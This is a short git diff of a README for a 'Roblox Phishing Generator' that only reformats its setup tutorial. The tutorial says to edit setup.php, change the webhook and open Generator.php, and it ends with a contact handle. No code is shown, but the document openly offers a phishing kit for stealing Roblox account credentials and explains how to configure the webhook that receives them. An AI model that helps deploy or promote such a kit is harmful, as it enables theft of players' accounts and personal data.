@@ -1,15 +1,13 @@
 # Roblox Phishing Generator
 
 
-**Tutorial: Go to setup.php
+```Tutorial: Go to setup.php
 
 change webhook 
 
 and everything else, save the setup.php and open Generator.php
 
-If everything is done correctly ur generator should work!
-
-**
+If everything is done correctly ur generator should work!```
 # Contact me
 
 Termed#0001
